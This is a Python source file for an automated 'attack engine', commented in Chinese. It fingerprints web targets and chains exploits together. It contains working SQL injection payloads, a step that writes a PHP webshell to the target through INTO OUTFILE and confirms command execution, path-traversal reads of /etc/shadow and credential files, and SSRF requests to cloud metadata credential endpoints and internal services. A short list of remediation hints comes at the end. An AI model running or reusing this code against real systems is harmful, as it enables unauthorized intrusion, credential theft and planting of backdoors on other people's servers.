"""
Advanced Attack Engine - 高级攻击引擎
支持链式攻击、自动化利用、智能Payload选择
"""

import asyncio
import re
import json
import logging
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)


class AttackPhase(Enum):
    RECON = "recon"
    SCAN = "scan"
    EXPLOIT = "exploit"
    POST_EXPLOIT = "post_exploit"


class VulnType(Enum):
    SQLI = "sqli"
    XSS = "xss"
    LFI = "lfi"
    RCE = "rce"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    UPLOAD = "upload"
    DESERIALIZATION = "deserialization"


@dataclass
class ExploitResult:
    """利用结果"""
    success: bool
    vuln_type: VulnType
    target: str
    payload: str
    evidence: str
    severity: str
    exploitable: bool = False
    shell_obtained: bool = False
    data_extracted: str = ""
    next_steps: List[str] = field(default_factory=list)


class PayloadOptimizer:
    """智能Payload优化器"""
    
    def __init__(self):
        self.success_history: Dict[str, List[str]] = {}
        self.fail_history: Dict[str, List[str]] = {}
    
    def get_optimized_payloads(self, vuln_type: str, context: Dict) -> List[str]:
        """根据上下文获取优化的Payload列表"""
        from core.payloads.sqli import ALL_SQLI, SQLI_WAF_BYPASS
        from core.payloads.xss import ALL_XSS, XSS_WAF_BYPASS
        from core.payloads.lfi import ALL_LFI, PHP_WRAPPERS
        from core.payloads.rce import ALL_RCE, RCE_BYPASS
        
        payloads = []
        
        # 检测到WAF时使用绕过payload
        has_waf = context.get("waf_detected", False)
        tech_stack = context.get("technology", "").lower()
        
        if vuln_type == "sqli":
            if has_waf:
                payloads = SQLI_WAF_BYPASS + ALL_SQLI[:20]
            else:
                payloads = ALL_SQLI
            
            # 根据数据库类型优化
            if "mysql" in tech_stack:
                payloads = [p for p in payloads if "MSSQL" not in p and "ORACLE" not in p]
            elif "mssql" in tech_stack or "sqlserver" in tech_stack:
                payloads = [p for p in payloads if "SLEEP" not in p]
                
        elif vuln_type == "xss":
            if has_waf:
                payloads = XSS_WAF_BYPASS + ALL_XSS[:20]
            else:
                payloads = ALL_XSS
                
        elif vuln_type == "lfi":
            payloads = ALL_LFI
            # PHP环境添加wrapper
            if "php" in tech_stack:
                payloads = PHP_WRAPPERS + payloads
                
        elif vuln_type == "rce":
            if has_waf:
                payloads = RCE_BYPASS + ALL_RCE[:20]
            else:
                payloads = ALL_RCE
        
        # 根据历史成功率排序
        if vuln_type in self.success_history:
            successful = self.success_history[vuln_type]
            payloads = sorted(payloads, key=lambda p: p in successful, reverse=True)
        
        return payloads[:50]  # 限制数量
    
    def record_result(self, vuln_type: str, payload: str, success: bool):
        """记录测试结果"""
        if success:
            if vuln_type not in self.success_history:
                self.success_history[vuln_type] = []
            self.success_history[vuln_type].append(payload)
        else:
            if vuln_type not in self.fail_history:
                self.fail_history[vuln_type] = []
            self.fail_history[vuln_type].append(payload)


class ChainAttackEngine:
    """链式攻击引擎 - 自动化攻击链"""
    
    # 攻击链定义：漏洞类型 -> 可能的后续利用
    ATTACK_CHAINS = {
        VulnType.SQLI: [
            ("extract_data", "提取数据库数据"),
            ("get_shell", "通过INTO OUTFILE写入webshell"),
            ("read_file", "读取系统文件"),
        ],
        VulnType.LFI: [
            ("read_sensitive", "读取敏感配置"),
            ("log_poisoning", "日志投毒RCE"),
            ("php_wrapper_rce", "PHP filter链RCE"),
        ],
        VulnType.SSRF: [
            ("cloud_metadata", "获取云元数据"),
            ("internal_scan", "内网端口扫描"),
            ("redis_rce", "Redis未授权RCE"),
        ],
        VulnType.XXE: [
            ("file_read", "读取本地文件"),
            ("ssrf_chain", "SSRF内网探测"),
            ("oob_exfil", "OOB数据外带"),
        ],
        VulnType.SSTI: [
            ("rce", "直接命令执行"),
            ("read_config", "读取配置文件"),
        ],
    }
    
    def __init__(self, http_client=None):
        self.http_client = http_client
        self.optimizer = PayloadOptimizer()
        self.results: List[ExploitResult] = []
    
    async def execute_chain(self, initial_vuln: VulnType, target: str, context: Dict) -> List[ExploitResult]:
        """执行攻击链"""
        chain_results = []
        
        # 获取可能的后续攻击
        next_attacks = self.ATTACK_CHAINS.get(initial_vuln, [])
        
        for attack_type, description in next_attacks:
            logger.info(f"[Chain] Attempting: {description}")
            
            result = await self._execute_chain_step(initial_vuln, attack_type, target, context)
            if result:
                chain_results.append(result)
                
                # 成功则继续深入
                if result.success and result.shell_obtained:
                    logger.info(f"[!] Shell obtained on {target}")
                    break
        
        return chain_results
    
    async def _execute_chain_step(self, vuln_type: VulnType, attack_type: str, 
                                   target: str, context: Dict) -> Optional[ExploitResult]:
        """执行单步攻击"""
        
        if vuln_type == VulnType.SQLI:
            if attack_type == "extract_data":
                return await self._sqli_extract_data(target, context)
            elif attack_type == "get_shell":
                return await self._sqli_get_shell(target, context)
                
        elif vuln_type == VulnType.LFI:
            if attack_type == "read_sensitive":
                return await self._lfi_read_sensitive(target, context)
            elif attack_type == "php_wrapper_rce":
                return await self._lfi_php_rce(target, context)
                
        elif vuln_type == VulnType.SSRF:
            if attack_type == "cloud_metadata":
                return await self._ssrf_cloud_metadata(target, context)
            elif attack_type == "internal_scan":
                return await self._ssrf_internal_scan(target, context)
        
        return None
    
    async def _sqli_extract_data(self, target: str, context: Dict) -> ExploitResult:
        """SQLi数据提取"""
        extracted = []
        
        # 尝试获取数据库版本、用户、数据库名
        payloads = [
            ("version", "' UNION SELECT @@version,NULL,NULL--"),
            ("user", "' UNION SELECT user(),NULL,NULL--"),
            ("database", "' UNION SELECT database(),NULL,NULL--"),
        ]
        
        for name, payload in payloads:
            try:
                resp = await self.http_client.get(self._inject(target, payload))
                body = resp.get("body", "")
                # 简单检测是否有数据返回
                if len(body) > 100:
                    extracted.append(f"{name}: detected")
            except:
                pass
        
        return ExploitResult(
            success=len(extracted) > 0,
            vuln_type=VulnType.SQLI,
            target=target,
            payload="UNION SELECT",
            evidence="; ".join(extracted),
            severity="high",
            data_extracted=str(extracted)
        )
    
    async def _sqli_get_shell(self, target: str, context: Dict) -> ExploitResult:
        """SQLi写入WebShell"""
        # 尝试INTO OUTFILE
        shell_content = "<?php system($_GET['c']);?>"
        payload = f"' UNION SELECT '{shell_content}' INTO OUTFILE '/var/www/html/shell.php'--"
        
        try:
            await self.http_client.get(self._inject(target, payload))
            
            # 验证shell是否写入成功
            shell_url = target.rsplit("/", 1)[0] + "/shell.php?c=id"
            resp = await self.http_client.get(shell_url)
            
            if "uid=" in resp.get("body", ""):
                return ExploitResult(
                    success=True,
                    vuln_type=VulnType.SQLI,
                    target=target,
                    payload="INTO OUTFILE",
                    evidence="Shell written successfully",
                    severity="critical",
                    shell_obtained=True,
                    exploitable=True
                )
        except:
            pass
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.SQLI,
            target=target,
            payload="INTO OUTFILE",
            evidence="Failed to write shell",
            severity="high"
        )
    
    async def _lfi_read_sensitive(self, target: str, context: Dict) -> ExploitResult:
        """LFI读取敏感文件"""
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "../../../.env",
            "../../../wp-config.php",
            "../../../config/database.yml",
        ]
        
        found_files = []
        
        for filepath in sensitive_files:
            payload = f"../../../../{filepath}"
            try:
                resp = await self.http_client.get(self._inject(target, payload))
                body = resp.get("body", "")
                
                if "root:" in body or "DB_PASSWORD" in body or "password:" in body:
                    found_files.append(filepath)
            except:
                pass
        
        return ExploitResult(
            success=len(found_files) > 0,
            vuln_type=VulnType.LFI,
            target=target,
            payload="path traversal",
            evidence=f"Read: {', '.join(found_files)}",
            severity="critical" if found_files else "medium",
            data_extracted=str(found_files)
        )
    
    async def _lfi_php_rce(self, target: str, context: Dict) -> ExploitResult:
        """LFI PHP filter链RCE"""
        # PHP filter chain payload
        filter_payload = "php://filter/convert.base64-encode/resource=index.php"
        
        try:
            resp = await self.http_client.get(self._inject(target, filter_payload))
            body = resp.get("body", "")
            
            # 检查是否返回base64编码内容
            if re.match(r'^[A-Za-z0-9+/=]{50,}$', body.strip()):
                return ExploitResult(
                    success=True,
                    vuln_type=VulnType.LFI,
                    target=target,
                    payload="php://filter",
                    evidence="Source code disclosed via php://filter",
                    severity="high",
                    exploitable=True
                )
        except:
            pass
        
        return ExploitResult(
            success=False,
            vuln_type=VulnType.LFI,
            target=target,
            payload="php://filter",
            evidence="PHP filter not working",
            severity="medium"
        )
    
    async def _ssrf_cloud_metadata(self, target: str, context: Dict) -> ExploitResult:
        """SSRF获取云元数据"""
        metadata_endpoints = [
            ("AWS", "http://169.254.169.254/latest/meta-data/"),
            ("AWS-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
            ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ]
        
        found = []
        
        for cloud, endpoint in metadata_endpoints:
            try:
                resp = await self.http_client.get(self._inject(target, endpoint))
                body = resp.get("body", "")
                
                if any(x in body for x in ["ami-id", "instance-id", "AccessKeyId", "computeMetadata"]):
                    found.append(cloud)
            except:
                pass
        
        return ExploitResult(
            success=len(found) > 0,
            vuln_type=VulnType.SSRF,
            target=target,
            payload="cloud metadata",
            evidence=f"Cloud detected: {', '.join(found)}",
            severity="critical" if found else "medium",
            exploitable=len(found) > 0
        )
    
    async def _ssrf_internal_scan(self, target: str, context: Dict) -> ExploitResult:
        """SSRF内网扫描"""
        internal_targets = [
            ("127.0.0.1:22", "SSH"),
            ("127.0.0.1:3306", "MySQL"),
            ("127.0.0.1:6379", "Redis"),
            ("127.0.0.1:27017", "MongoDB"),
            ("127.0.0.1:9200", "Elasticsearch"),
            ("192.168.1.1:80", "Router"),
        ]
        
        open_services = []
        
        for addr, service in internal_targets:
            try:
                resp = await self.http_client.get(self._inject(target, f"http://{addr}"))
                if resp.get("status") != 0:
                    open_services.append(f"{service}({addr})")
            except:
                pass
        
        return ExploitResult(
            success=len(open_services) > 0,
            vuln_type=VulnType.SSRF,
            target=target,
            payload="internal scan",
            evidence=f"Open services: {', '.join(open_services)}",
            severity="high" if open_services else "low",
            next_steps=[f"Exploit {s}" for s in open_services]
        )
    
    def _inject(self, url: str, payload: str) -> str:
        """注入payload到URL"""
        if "?" in url:
            # 注入到第一个参数
            base, query = url.split("?", 1)
            params = query.split("&")
            if params:
                key, val = params[0].split("=", 1) if "=" in params[0] else (params[0], "")
                params[0] = f"{key}={val}{payload}"
            return base + "?" + "&".join(params)
        return url + "?id=" + payload


class AdvancedAttackEngine:
    """高级攻击引擎 - 整合所有攻击能力"""
    
    def __init__(self, http_client=None, config: Dict = None):
        self.http_client = http_client
        self.config = config or {}
        self.chain_engine = ChainAttackEngine(http_client)
        self.optimizer = PayloadOptimizer()
        self.results: List[ExploitResult] = []
    
    async def smart_scan(self, target: str, context: Dict = None) -> Dict:
        """智能扫描 - 自动识别并利用漏洞"""
        context = context or {}
        results = {
            "target": target,
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # 1. 检测技术栈和WAF
        fingerprint = await self._fingerprint_target(target)
        context.update(fingerprint)
        
        # 2. 根据技术栈选择测试类型
        vuln_types = self._select_vuln_types(fingerprint)
        
        # 3. 逐个测试
        for vuln_type in vuln_types:
            vuln_result = await self._test_vulnerability(target, vuln_type, context)
            if vuln_result.success:
                results["vulnerabilities"].append(vuln_result.__dict__)
                
                # 4. 尝试链式利用
                if self.config.get("auto_exploit", False):
                    chain_results = await self.chain_engine.execute_chain(
                        vuln_type, target, context
                    )
                    results["exploits"].extend([r.__dict__ for r in chain_results])
        
        # 5. 生成建议
        results["recommendations"] = self._generate_recommendations(results)
        
        return results
    
    async def _fingerprint_target(self, target: str) -> Dict:
        """指纹识别"""
        result = {
            "waf_detected": False,
            "technology": "",
            "server": "",
        }
        
        try:
            resp = await self.http_client.get(target)
            headers = resp.get("headers", {})
            body = resp.get("body", "")
            
            # WAF检测
            waf_indicators = ["cloudflare", "akamai", "incapsula", "mod_security"]
            header_str = str(headers).lower()
            for waf in waf_indicators:
                if waf in header_str or waf in body.lower():
                    result["waf_detected"] = True
                    break
            
            # 服务器
            result["server"] = headers.get("server", "")
            
            # 技术栈
            if "php" in header_str or "PHPSESSID" in str(headers):
                result["technology"] = "php"
            elif "ASP.NET" in str(headers):
                result["technology"] = "aspnet"
            elif "Express" in str(headers) or "node" in body.lower():
                result["technology"] = "nodejs"
            elif "Django" in body or "csrfmiddlewaretoken" in body:
                result["technology"] = "django"
                
        except Exception as e:
            logger.debug(f"Fingerprint error: {e}")
        
        return result
    
    def _select_vuln_types(self, fingerprint: Dict) -> List[VulnType]:
        """根据指纹选择要测试的漏洞类型"""
        vuln_types = [VulnType.SQLI, VulnType.XSS]  # 基础测试
        
        tech = fingerprint.get("technology", "").lower()
        
        if tech == "php":
            vuln_types.extend([VulnType.LFI, VulnType.RCE, VulnType.SSTI])
        elif tech == "django":
            vuln_types.extend([VulnType.SSTI])
        elif tech == "nodejs":
            vuln_types.extend([VulnType.SSRF, VulnType.SSTI])
        
        # 始终测试SSRF
        if VulnType.SSRF not in vuln_types:
            vuln_types.append(VulnType.SSRF)
        
        return vuln_types
    
    async def _test_vulnerability(self, target: str, vuln_type: VulnType, 
                                   context: Dict) -> ExploitResult:
        """测试单个漏洞类型"""
        payloads = self.optimizer.get_optimized_payloads(vuln_type.value, context)
        
        for payload in payloads[:10]:  # 限制测试数量
            try:
                test_url = self.chain_engine._inject(target, payload)
                resp = await self.http_client.get(test_url)
                body = resp.get("body", "")
                
                if self._detect_vuln(vuln_type, body, payload):
                    self.optimizer.record_result(vuln_type.value, payload, True)
                    return ExploitResult(
                        success=True,
                        vuln_type=vuln_type,
                        target=target,
                        payload=payload,
                        evidence=body[:200],
                        severity=self._get_severity(vuln_type),
                        exploitable=True
                    )
                else:
                    self.optimizer.record_result(vuln_type.value, payload, False)
                    
            except Exception as e:
                logger.debug(f"Test error: {e}")
        
        return ExploitResult(
            success=False,
            vuln_type=vuln_type,
            target=target,
            payload="",
            evidence="",
            severity="info"
        )
    
    def _detect_vuln(self, vuln_type: VulnType, body: str, payload: str) -> bool:
        """检测漏洞是否存在"""
        if vuln_type == VulnType.SQLI:
            return bool(re.search(r"(sql|syntax|mysql|ORA-|error)", body, re.I))
        elif vuln_type == VulnType.XSS:
            return payload in body
        elif vuln_type == VulnType.LFI:
            return bool(re.search(r"root:.*:0:0", body))
        elif vuln_type == VulnType.SSRF:
            return bool(re.search(r"(ami-id|instance-id|metadata)", body, re.I))
        elif vuln_type == VulnType.SSTI:
            return "49" in body  # {{7*7}}
        return False
    
    def _get_severity(self, vuln_type: VulnType) -> str:
        """获取漏洞严重性"""
        severity_map = {
            VulnType.RCE: "critical",
            VulnType.SQLI: "critical",
            VulnType.LFI: "high",
            VulnType.SSRF: "high",
            VulnType.XXE: "high",
            VulnType.SSTI: "high",
            VulnType.XSS: "medium",
            VulnType.IDOR: "medium",
        }
        return severity_map.get(vuln_type, "medium")
    
    def _generate_recommendations(self, results: Dict) -> List[str]:
        """生成修复建议"""
        recommendations = []
        
        for vuln in results.get("vulnerabilities", []):
            vuln_type = vuln.get("vuln_type", "")
            
            if "SQLI" in str(vuln_type):
                recommendations.append("使用参数化查询/预处理语句防止SQL注入")
            elif "XSS" in str(vuln_type):
                recommendations.append("实施输入验证和输出编码防止XSS")
            elif "LFI" in str(vuln_type):
                recommendations.append("验证文件路径，使用白名单限制可访问文件")
            elif "SSRF" in str(vuln_type):
                recommendations.append("限制出站请求，验证URL白名单")
            elif "SSTI" in str(vuln_type):
                recommendations.append("禁用危险模板功能，使用沙箱环境")
        
        return list(set(recommendations))
